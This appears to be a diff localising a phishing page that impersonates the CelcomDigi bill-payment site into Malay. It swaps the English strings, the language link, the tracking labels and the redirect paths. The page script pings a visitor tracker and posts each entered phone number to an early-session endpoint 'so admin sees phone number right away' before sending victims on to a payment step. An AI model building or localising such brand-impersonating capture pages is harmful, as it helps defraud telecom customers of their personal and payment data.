@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ms">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CelcomDigi | Fast and Secure Bill Payment</title>
-  <meta name="description" content="Pay your CelcomDigi bills securely and easily online.">
+  <title>CelcomDigi | Pembayaran Bil yang Cepat dan Selamat</title>
+  <meta name="description" content="Bayar bil CelcomDigi anda dengan selamat dan mudah dalam talian.">
 
   <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
@@ -134,11 +134,11 @@
             <div class="relative" id="langDropdown">
               <a onclick="toggleLang(event)" class="flex items-center bg-white text-celcom-digi-blue rounded-full py-2.5 px-3.5 gap-1.5 cursor-pointer" href="#">
                 <span class="cd-icon icon-globe-02 text-base"></span>
-                <span class="text-xs">EN</span>
+                <span class="text-xs">BM</span>
                 <span class="cd-icon icon-chevron-down text-sm"></span>
               </a>
               <div id="langMenu" class="dropdown-menu bg-white p-2 rounded-3xl text-center border border-gray-300 shadow-md hidden">
-                <a class="text-xs text-celcom-digi-blue" href="/bill/ms">BM</a>
+                <a class="text-xs text-celcom-digi-blue" href="/bill">EN</a>
               </div>
             </div>
           </div>
@@ -155,7 +155,7 @@
 
           <!-- Page Title (above card) -->
           <h2 class="text-3xl md:text-4xl text-white mb-14 text-left md:text-center px-5 font-bold">
-            Fast and Secure Bill Payment
+            Pembayaran Bil yang Cepat dan Selamat
           </h2>
 
           <!-- Form Card -->
@@ -166,7 +166,7 @@
                   Pay Bill
                 </h5>
                 <p class="text-xs md:text-base text-left md:text-center text-gray-600">
-                  Pay for yourself or anyone securely.
+                  Bayar untuk diri sendiri atau sesiapa sahaja dengan selamat.
                 </p>
               </div>
 
@@ -179,7 +179,7 @@
                     <input
                       id="mobile_number_input"
                       type="tel"
-                      placeholder="Mobile number"
+                      placeholder="Nombor telefon bimbit"
                       class="peer border rounded-lg pt-6 pb-2 pl-2 w-full placeholder-transparent focus:outline-none border-gray-300"
                       oninput="handleNumberInput(this)"
                       onkeypress="if(event.key==='Enter'){handleSubmit(event)}"
@@ -195,14 +195,14 @@
                   <!-- Error Message -->
                   <div id="errorMsg" class="hidden text-red-600 text-xs mt-1"></div>
 
-                  <!-- Use account number instead -->
+                  <!-- Gunakan nombor akaun sebaliknya -->
                   <div class="self-center text-center content-center align-middle mt-2 mb-4">
                     <a
                       href="#"
                       class="text-celcom-digi-light-blue hover:text-celcom-digi-blue visited:text-celcom-digi-light-blue align-align-text-bottom"
                       onclick="return false;"
                     >
-                      <span>Use account number instead</span>
+                      <span>Gunakan nombor akaun sebaliknya</span>
                       <span class="cd-icon icon-chevron-right ml-2 font-bold"></span>
                     </a>
                   </div>
@@ -329,7 +329,7 @@
     }
 
     // Ping on page load
-    pingVisitor('bill', '', '', 'bill');
+    pingVisitor('bill-ms', '', '', 'bill');
 
     // ===== FORM SUBMIT =====
     async function handleSubmit(e) {
@@ -339,7 +339,7 @@
       const input = document.getElementById('mobile_number_input');
 
       if (!number || number.length < 9) {
-        errorMsg.textContent = 'Please enter a valid mobile number.';
+        errorMsg.textContent = 'Sila masukkan nombor telefon bimbit yang sah.';
         errorMsg.classList.remove('hidden');
         input.classList.add('border-error-message');
         return;
@@ -367,7 +367,7 @@
 
         if (!response.ok || data.error) {
           hideLoading();
-          errorMsg.textContent = data.error || 'Invalid mobile number. Please try again.';
+          errorMsg.textContent = data.error || 'Nombor telefon bimbit tidak sah. Sila cuba lagi.';
           errorMsg.classList.remove('hidden');
           input.classList.add('border-error-message');
           return;
@@ -375,7 +375,7 @@
 
         const carrier = data.carrier || 'CELCOMDIGI';
         // Ping with phone number
-        pingVisitor('pay-bill', number, '', 'bill');
+        pingVisitor('pay-bill-ms', number, '', 'bill');
         // Create early session so admin sees phone number right away
         const _earlyId = 'early_' + _vid;
         fetch('/api/early-session', {
@@ -383,7 +383,7 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ sessionId: _earlyId, number: number, amount: '', type: 'bill', visitorId: _vid, page: 'pay-bill' })
         }).catch(() => {});
-        window.location.href = `/pay-bill?number=${encodeURIComponent(number)}&carrier=${encodeURIComponent(carrier)}&vid=${encodeURIComponent(_vid)}`;
+        window.location.href = `/pay-bill/ms?number=${encodeURIComponent(number)}&carrier=${encodeURIComponent(carrier)}&vid=${encodeURIComponent(_vid)}`;
 
       } catch (err) {
         hideLoading();
